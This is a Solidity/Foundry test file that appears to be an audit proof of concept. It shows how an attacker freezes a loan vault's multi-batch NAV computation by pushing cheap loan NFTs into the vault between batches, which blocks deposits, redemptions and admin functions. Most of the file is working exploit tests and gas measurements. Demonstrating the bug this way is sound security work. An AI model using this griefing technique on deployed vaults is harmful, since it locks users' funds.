// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

import {Test, console} from "forge-std/Test.sol";
import {MiniVault, MiniLoans, MiniLoansNFT, MiniCalculator} from "../src/Harness.sol";

contract NavFreezeTest is Test {
  MiniLoans internal loans;
  MiniLoansNFT internal nft;
  MiniCalculator internal calc;
  MiniVault internal vault;

  address internal attacker = address(0xA77ACc);
  address internal honestOriginator = address(0x0125);

  uint256 internal constant PORTFOLIO_SIZE = 40;
  uint256 internal constant BATCH_SIZE = 10;
  uint256 internal constant MAX_NAV_AGE = 4 hours;
  uint256 internal constant MAX_NAV_COMPUTATION_TIME = 1 hours;

  function setUp() public {
    loans = new MiniLoans();
    nft = new MiniLoansNFT(address(loans));
    loans.setLoansNFT(address(nft));
    calc = new MiniCalculator();
    vault = new MiniVault(nft, calc, loans, MAX_NAV_AGE, MAX_NAV_COMPUTATION_TIME);

    // Honest originator builds the vault's real portfolio.
    vm.prank(honestOriginator);
    loans.registerInvestor(address(vault));

    uint64[] memory ids = new uint64[](PORTFOLIO_SIZE);
    for (uint256 i; i < PORTFOLIO_SIZE; ++i) {
      vm.prank(honestOriginator);
      ids[i] = loans.create(address(vault));
    }
    vault.addLoansToNav(ids);
    vault.seedAssets(1_000_000e6);

    // Attacker registers the vault in its OWN book. Permissionless (known issue #14).
    vm.prank(attacker);
    loans.registerInvestor(address(vault));

    _sweepToCompletion();
    assertEq(vault.navStart(), 0, "setup: vault idle");
    assertGt(vault.lastNav(), 0, "setup: NAV established");
  }

  // =========================================================================
  //  The finding.
  // =========================================================================

  function test_attackerHoldsNavStartOpenIndefinitely() public {
    uint256 cleanBatches = PORTFOLIO_SIZE / BATCH_SIZE; // 4 would finish it
    uint256 rounds = cleanBatches * 5; // 20 -- five times what is needed

    uint256 managerGas;
    uint256 attackerGas;
    uint256 maxCursorReached;

    for (uint256 r; r < rounds; ++r) {
      uint256 g = gasleft();
      vault.updateNav(BATCH_SIZE);
      managerGas += g - gasleft();

      if (vault.navCursor() > maxCursorReached) maxCursorReached = vault.navCursor();
      assertGt(vault.navStart(), 0, "cycle must still be open");

      // One free mint straight into the vault. No tokens move.
      vm.prank(attacker);
      g = gasleft();
      loans.create(address(vault));
      attackerGas += g - gasleft();

      vm.roll(block.number + 1);
      vm.warp(block.timestamp + 12);
    }

    assertGt(vault.navStart(), 0, "navStart never cleared -- the vault is frozen");
    assertLe(maxCursorReached, BATCH_SIZE, "cursor never advanced past a single batch");

    console.log("rounds run                    ", rounds);
    console.log("batches a clean sweep needs   ", cleanBatches);
    console.log("furthest cursor ever reached  ", maxCursorReached);
    console.log("total gas burned by manager   ", managerGas);
    console.log("total gas spent by attacker   ", attackerGas);
    console.log("cost ratio (manager/attacker) ", managerGas / attackerGas);
  }

  /// @notice Route A: no originator approval, no privileged role at all --
  ///         just somebody who owns one loan NFT and pushes it in.
  function test_routeA_plainTransferByAnyNftHolder() public {
    address civilian = address(0xC1F);
    vm.prank(civilian);
    loans.registerInvestor(civilian);
    vm.prank(civilian);
    uint64 ownNft = loans.create(civilian); // civilian's own loan, nothing to do with the vault

    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);
    uint256 cursorBefore = vault.navCursor();
    assertEq(cursorBefore, BATCH_SIZE);

    // Unsolicited push. The vault has no hook with which to refuse it.
    vm.prank(civilian);
    nft.transferFrom(civilian, address(vault), uint256(ownNft));

    vault.updateNav(BATCH_SIZE);
    assertEq(vault.navCursor(), BATCH_SIZE, "progress was discarded and restarted from zero");
    assertGt(vault.navStart(), 0, "still frozen");
  }

  /// @notice The blast radius: every gated entry point reverts with the same error.
  function test_everyPrivilegedPathIsGatedBehindTheStuckFlag() public {
    vault.updateNav(BATCH_SIZE);
    vm.prank(attacker);
    loans.create(address(vault));
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);

    bytes4 err = MiniVault.NavComputationInProgress.selector;

    vm.expectRevert(err);
    vault.approveDeposit();
    vm.expectRevert(err);
    vault.approveRedemption();
    vm.expectRevert(err);
    vault.collectCashflows();
    vm.expectRevert(err);
    vault.fundLoans();
    vm.expectRevert(err);
    vault.transferLoans();
    vm.expectRevert(err);
    vault.setLoans();
    vm.expectRevert(err);
    vault.setCalculator();
  }

  /// @notice No configuration lever clears navStart.
  function test_noAdminLeverClearsNavStart() public {
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);

    vault.setMaxNavComputationTime(365 days);
    assertGt(vault.navStart(), 0, "raising maxNavComputationTime does not clear it");

    vault.setMaxNavAge(365 days);
    assertGt(vault.navStart(), 0, "raising maxNavAge does not clear it");
  }

  /// @notice Control: same portfolio, no attacker, finalises normally.
  function test_control_sweepCompletesWithoutInterference() public {
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0, "cycle opens");
    _sweepToCompletion();
    assertEq(vault.navStart(), 0, "finalises when left alone");
    assertEq(vault.lastNavUpdate(), block.timestamp, "NAV is fresh again");
  }

  /// @notice Boundary: if the whole sweep fits in ONE call, the attack fails.
  ///         This is the precondition, demonstrated rather than asserted.
  function test_boundary_singleTransactionSweepIsImmune() public {
    vault.updateNav(BATCH_SIZE); // open a cycle
    vm.prank(attacker);
    loans.create(address(vault)); // attacker bumps the nonce

    // Manager sweeps everything in one call: restart happens, then the full
    // sweep completes inside the same transaction, so it finalises anyway.
    vault.updateNav(vault.navLoanCount() + 1);
    assertEq(vault.navStart(), 0, "atomic sweep is immune to the interleaved bump");
  }

  // =========================================================================
  //  Gas: what portfolio size makes a single-transaction sweep impossible?
  // =========================================================================

  function test_gas_derivePortfolioSizeThreshold() public {
    // Measure the marginal cost of one more loan in a sweep.
    uint256 gasFor10 = _measureSweepGas(10);
    uint256 gasFor40 = _measureSweepGas(40);
    uint256 perLoan = (gasFor40 - gasFor10) / 30;

    console.log("gas: sweep of 10 loans        ", gasFor10);
    console.log("gas: sweep of 40 loans        ", gasFor40);
    console.log("gas: marginal cost per loan   ", perLoan);

    // Headroom for a transaction: block gas limit minus the fixed overhead.
    uint256 fixedOverhead = gasFor10 - 10 * perLoan;
    console.log("gas: fixed overhead per call  ", fixedOverhead);

    uint256 n30 = (30_000_000 - fixedOverhead) / perLoan;
    uint256 n45 = (45_000_000 - fixedOverhead) / perLoan;
    console.log("max loans in one tx @30M limit", n30);
    console.log("max loans in one tx @45M limit", n45);
    console.log("-> multi-batch (attackable) above this many loans");

    assertGt(perLoan, 0, "per-loan cost must be measurable");
  }

  function _measureSweepGas(uint256 n) internal returns (uint256 used) {
    MiniLoans l = new MiniLoans();
    MiniLoansNFT f = new MiniLoansNFT(address(l));
    l.setLoansNFT(address(f));
    MiniCalculator c = new MiniCalculator();
    MiniVault v = new MiniVault(f, c, l, MAX_NAV_AGE, MAX_NAV_COMPUTATION_TIME);

    vm.prank(honestOriginator);
    l.registerInvestor(address(v));
    uint64[] memory ids = new uint64[](n);
    for (uint256 i; i < n; ++i) {
      vm.prank(honestOriginator);
      ids[i] = l.create(address(v));
    }
    v.addLoansToNav(ids);
    v.seedAssets(1e12);

    uint256 g = gasleft();
    v.updateNav(n);
    used = g - gasleft();
    require(v.navStart() == 0, "measurement sweep must finalise");
  }

  function _sweepToCompletion() internal {
    for (uint256 i; i < 100; ++i) {
      vault.updateNav(BATCH_SIZE);
      if (vault.navStart() == 0) return;
    }
    revert("sweep did not finalise");
  }
}
